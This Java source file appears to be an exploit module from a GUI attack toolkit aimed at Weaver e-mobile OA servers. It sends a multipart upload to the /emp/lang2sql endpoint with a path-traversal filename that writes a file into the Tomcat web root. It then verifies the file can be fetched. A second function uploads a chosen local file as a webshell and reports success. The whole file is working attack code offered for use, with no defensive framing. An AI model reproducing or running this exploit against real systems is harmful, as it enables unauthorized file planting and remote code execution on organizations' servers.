package exp.oa.weaveroa.emobile;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class weaver_em_lang2sql_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String target_url(String url, String payload) {
        try {
            HttpTools post_res = new HttpTools();
            long t = (new Date()).getTime();
            String filename = t+".txt";
            HashMap<String,String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK");

            String data1 = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../appsvr/tomcat/webapps/ROOT/"+filename+"\"\r\n" +
                    "\r\n" +
                    payload +
                    "\r\n"+
                    "------WebKitFormBoundarymVk33liI64J7GQaK";
            Response post_resp = post_res.post(url + "/emp/lang2sql?client_type=1&lang_tag=1",data1, head,"utf-8");
            if(post_resp.getText().contains("errcode")&& post_resp.getCode()==200){
                Response var = HttpTools.get(url+"/"+filename,new HashMap<>(),"utf-8");
                if(var.getCode()==200 && var.getText().contains(payload.substring(0,2))){
                    return url+"/"+filename;
                }
            }

        } catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g";
            String result = target_url(url,payload);

            if ( result!=null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_em_lang2sql_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
//                textArea.appendText("\n weaver_ec_UploaderOperate_upload-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }


    private boolean attcmd(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload ="R4g\n"+ Methods.readFile(pass);

            String result = target_url(url,shell_payload);
            if ( result!=null) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+result);
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
